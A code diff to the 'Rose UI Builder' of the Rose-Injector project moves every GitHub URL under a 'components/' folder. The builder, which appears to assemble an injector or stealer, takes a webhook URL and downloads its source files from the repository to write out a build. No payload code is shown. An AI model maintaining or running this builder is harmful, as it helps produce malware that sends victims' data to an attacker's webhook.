@@ -43,11 +43,11 @@ logger = logging.getLogger(__name__)
 
 
 __title__ = 'Rose UI Builder'
-__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png'
+__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/RoseWBG.png'
 __version__ = '1.1'
 __debugm__ = False # Change only if you are a dev 
-__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"
-__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/msg.txt").text.splitlines()[0].split(" - ")
+__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/tools/rose.png"
+__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {
     "webhook_url": "",
@@ -178,11 +178,11 @@ def _makebuild(q: Queue, data_builder) -> str:
     def make_req():
         try:
             logger.info("Entered make_req")
-            page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/source').text
+            page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/components/source').text
             soup = BeautifulSoup(page, 'html.parser')
-            allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/source/{link.text}"]
+            allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/components/source/{link.text}"]
             for file in allFiles:
-                text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
+                text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/source/{file}").text
                 logger.info(f"Got {file} with {len(text)} characters")
                 with open(f"{path}\\{file}","w",encoding="utf-8") as f:
                     logger.info(f"Writing {file} to {path}")
@@ -409,7 +409,7 @@ def superhome():
         with ui.tab_panel('Socials'):
             _github()
 
-v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
+v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/components/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
 v.on('ended', lambda _: ui.open('/home'))
 app.on_shutdown(pool.shutdown)
 
